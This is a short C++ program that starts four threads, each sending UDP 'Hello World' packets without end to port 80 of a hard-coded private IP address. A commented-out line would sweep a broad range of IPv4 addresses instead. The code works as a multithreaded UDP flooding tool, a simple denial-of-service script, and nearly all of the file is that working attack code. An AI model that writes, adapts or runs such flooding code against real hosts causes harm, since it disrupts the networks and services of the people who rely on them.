#include <iostream>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <strings.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <string>

using namespace std;

int PORT = 80;  
int toggle = 0;

bool udpSend(const char *msg){
    
    int i, j, k, l;
    for(i=10;i<=200;i++) {
        for(j = 10;j<=200;j++) {
            for(k=10;k<=200;k++) {
                for(l=10;l<=200;l++) {
                    sockaddr_in servaddr;
                    int fd = socket(AF_INET,SOCK_DGRAM,0);
                    if(fd<0){
                        perror("cannot open socket");
                        return false;
                    }
                    //string s = ""; s += to_string(i) +"."+ to_string(j) +"."+ to_string(k) +"."+ to_string(l);
                 string s = "10.117.147.138";    
		
		const char *HOSTNAME = s.c_str();
                    //cout<<"IP: "<<s<<" "<<HOSTNAME<<endl;

                    bzero(&servaddr,sizeof(servaddr));
                    servaddr.sin_family = AF_INET;
                    servaddr.sin_addr.s_addr = inet_addr(HOSTNAME);
                    servaddr.sin_port = htons(PORT);
                   
                    if (sendto(fd, msg, strlen(msg)+1, 0, // +1 to include terminator
                               (sockaddr*)&servaddr, sizeof(servaddr)) < 0){
                        perror("cannot send message");
                        close(fd);
                        return false;
                    }
                    close(fd);
                }
            }
        }
    }
    
    return true;
}


void *perpetual(void *vargp) {
    while(1) {
        udpSend("Hello World");
    }
}

int main() {
    pthread_t tid1, tid2, tid3, tid4;
    int i = 0;
    pthread_create(&tid1, NULL, perpetual, NULL);
    pthread_create(&tid2, NULL, perpetual, NULL);
    pthread_create(&tid3, NULL, perpetual, NULL);
    pthread_create(&tid4, NULL, perpetual, NULL);
    pthread_join(tid1, NULL);
    pthread_join(tid2, NULL);
    pthread_join(tid3, NULL);
    pthread_join(tid4, NULL);
    
}
